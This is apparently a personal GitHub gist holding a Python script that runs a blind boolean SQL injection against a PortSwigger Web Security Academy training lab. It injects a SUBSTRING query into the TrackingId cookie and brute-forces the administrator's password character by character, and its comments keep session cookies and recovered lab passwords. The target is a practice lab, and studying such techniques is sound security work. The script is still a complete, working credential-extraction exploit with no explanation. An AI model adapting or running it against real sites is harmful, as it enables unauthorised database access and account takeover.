# https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
import requests, string, sys, warnings, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

req = requests.Session()
url = "https://0a6400610401492b814ef27000cd0074.web-security-academy.net/filter?category=Gifts"
hint = "Welcome back!"

# Cookie: TrackingId=h2dGFtb9XTYwq4zk; session=6hkZoumrQhrU9o4i03CQxdXkDpyTiePP
#Cookie: TrackingId=U4C6AppR7kGOstFd; session=nHnUJ2tbo31l0bUHGZSA2lE3ftDRP5Vp
#Cookie: TrackingId=8HXcwxySckfsKq6Z; session=IRUMYWTNYDfVa7bqbHB1kxWsSe73E9vV

#TrackingId=4IQa4cVqolskHiiD; session=rgNepCADsCnJlsOEltsnzx9xRVSc4fw2
password = ""  # ag2yj74y5ng8k1uvbxni // length 21
# kthtccl0eonf2ki7z3ew
#ooll8jzd4dy2pmrdr7ql
index = 1
password_length = 20

# For debugging
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
while True:
    if index > password_length:
        print("\n Finished at index = ", index)
        break
    for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9
        sys.stdout.write(f"\r[+] Password: {password}{char}")
        cookies = {             #NOTICE EVERY TRIAL , WE RESET COOKIES
            "session": "rgNepCADsCnJlsOEltsnzx9xRVSc4fw2",
            "TrackingId": f"4IQa4cVqolskHiiD' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
        }
        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if hint in resp.text:
            password = password + char
            index = index + 1
            if index > password_length:
                print("\n Finished")
                break
